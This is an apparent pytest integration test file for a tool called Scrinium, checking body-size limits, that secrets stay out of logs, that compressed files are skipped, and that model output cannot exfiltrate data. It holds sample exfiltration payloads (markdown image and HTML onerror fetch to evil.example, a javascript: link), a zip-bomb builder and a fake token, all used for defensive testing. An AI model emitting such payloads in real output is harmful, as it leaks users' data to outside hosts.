"""Adversarial battery: huge bodies, leaks into logs and errors, exfiltration through
the model output, and compressed files in a repository."""

import io
import json
import logging
import socket
import zipfile
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from scrinium.api.middleware import MAX_BODY_BYTES
from tests.integration.test_analyses import DIFF, Api, api, repo
from tests.integration.test_ingestion import commit_all, write

__all__ = ["api", "repo"]

MARKER = "canariofuga4821"
GH_TOKEN = "ghp_" + "Q" * 36


def _runtime_logs(caplog: pytest.LogCaptureFixture) -> str:
    # httpx is the tests' client and logs its own URLs; it is not the runtime.
    return "\n".join(r.getMessage() for r in caplog.records if r.name != "httpx")


def test_declared_oversized_body_is_refused_before_reading(api: Api) -> None:
    response = api.runtime.client.post(
        f"/api/v1/projects/{api.project_id}/analyses/sql",
        content=b"x" * (MAX_BODY_BYTES + 1),
        headers={**api.headers, "Content-Type": "application/json"},
    )
    assert response.status_code == 413 and response.json() == {"error": "payload_too_large"}


def test_chunked_body_without_length_is_counted(api: Api) -> None:
    def chunks() -> Iterator[bytes]:
        for _ in range(5):
            yield b"x" * (MAX_BODY_BYTES // 4)

    response = api.runtime.client.post(
        f"/api/v1/projects/{api.project_id}/analyses/sql",
        content=chunks(),
        headers={**api.headers, "Content-Type": "application/json"},
    )
    assert response.status_code == 413


def test_bad_content_length_is_refused(api: Api) -> None:
    response = api.runtime.client.post(
        f"/api/v1/projects/{api.project_id}/analyses/sql",
        content=b"{}",
        headers={**api.headers, "Content-Type": "application/json", "Content-Length": "-1"},
    )
    assert response.status_code in (400, 413)


def test_unauthenticated_large_body_is_rejected_by_the_guard_first(api: Api) -> None:
    api.runtime.client.cookies.clear()
    response = api.runtime.client.post(
        "/api/v1/privacy/export", content=b"x" * (MAX_BODY_BYTES + 1)
    )
    # Without a session or Origin, the guard rejects it before anyone reads the body.
    assert response.status_code in (401, 403)


def test_inputs_never_reach_logs_or_error_bodies(
    api: Api, caplog: pytest.LogCaptureFixture
) -> None:
    caplog.set_level(logging.DEBUG)
    secret_sql = f"SELECT '{MARKER}', '{GH_TOKEN}' FROM invoices"  # noqa: S608  text only
    api.analysis("sql", {"sql": secret_sql})
    api.analysis("code-diff", {"diff": DIFF.replace("MARCADOR_DEL_DIFF", MARKER)})
    api.analysis("bug", {"description": f"Falla {MARKER} con {GH_TOKEN}"})
    passphrase = f"{MARKER}-frase-larga"
    api.runtime.client.post(
        "/api/v1/privacy/export", json={"passphrase": passphrase}, headers=api.headers
    )
    # Validation errors: they say where it fails, never echo what was sent.
    invalid = api.runtime.client.post(
        f"/api/v1/projects/{api.project_id}/analyses/sql",
        json={"sql": f"SELECT '{MARKER}'", "dialect": f"no-{MARKER}"},
        headers=api.headers,
    )
    assert invalid.status_code == 422 and MARKER not in invalid.text
    short = api.runtime.client.post(
        "/api/v1/privacy/export", json={"passphrase": MARKER[:5]}, headers=api.headers
    )
    assert MARKER[:5] not in short.text

    logs = _runtime_logs(caplog)
    assert "path=/api/v1/privacy/export" in logs
    assert MARKER not in logs and GH_TOKEN not in logs


@pytest.fixture
def no_network(monkeypatch: pytest.MonkeyPatch) -> list[Any]:
    """Records any network connection that is not to loopback."""
    attempts: list[Any] = []
    original = socket.socket.connect

    def guarded(self: socket.socket, address: Any) -> Any:
        host = address[0] if isinstance(address, tuple) else address
        if host not in ("127.0.0.1", "::1", "localhost") and not str(host).startswith("/"):
            attempts.append(address)
            raise OSError("network blocked in the test")
        return original(self, address)

    monkeypatch.setattr(socket.socket, "connect", guarded)
    return attempts


def test_model_output_cannot_exfiltrate(api: Api, no_network: list[Any]) -> None:
    """An answer trying to exfiltrate data (remote image, HTML, link) is stored as text:
    Scrinium does not interpret it, opens no connections, and the UI cannot load anything remote."""
    payloads = [
        f"![x](https://evil.example/collect?d={MARKER})",
        f'<img src="https://evil.example/{MARKER}" onerror="fetch(\'//evil.example\')">',
        "[pulsa](javascript:alert(1))",
    ]
    api.runtime.chat.reply = json.dumps(
        {"answer_status": "answered", "summary": payloads[0], "limitations": [payloads[2]],
         "claims": [{"text": payloads[1], "sources": [1]}]}
    )  # fmt: skip
    started = api.post(
        f"/api/v1/projects/{api.project_id}/questions", {"question": "calculate_invoice_total"}
    )
    detail = api.runtime.client.get(f"/api/v1/questions/{started['id']}").json()
    assert detail["result"]["summary"] == payloads[0]
    assert detail["result"]["claims"][0]["text"] == payloads[1]
    assert no_network == []
    # Even if a future version rendered HTML, the CSP only allows this same origin.
    csp = api.runtime.client.get("/api/v1/session").headers["content-security-policy"]
    assert "default-src 'self'" in csp
    assert "http" not in csp and "*" not in csp


def _zip_bomb() -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("ceros.txt", b"\0" * 50_000_000)
    return buffer.getvalue()


def test_compressed_files_are_never_opened(api: Api, tmp_path: Path) -> None:
    write(api.repo, "vendor/bomba.zip", _zip_bomb())
    write(api.repo, "vendor/paquete.tar.gz", b"\x1f\x8b\x08\x00" + b"\0" * 100)
    write(api.repo, "lib/app.jar", b"PK\x03\x04" + b"\0" * 100)
    commit_all(api.repo, "comprimidos")
    preview = api.post(
        f"/api/v1/projects/{api.project_id}/sources/preview",
        {"kind": "git_repository", "path": str(api.repo)},
        200,
    )
    reasons = {item["path"]: item["reason"] for item in preview["excluded"]}
    for path in ("vendor/bomba.zip", "vendor/paquete.tar.gz", "lib/app.jar"):
        assert path in reasons, path
    assert all(item["path"] != "ceros.txt" for item in preview["included"])
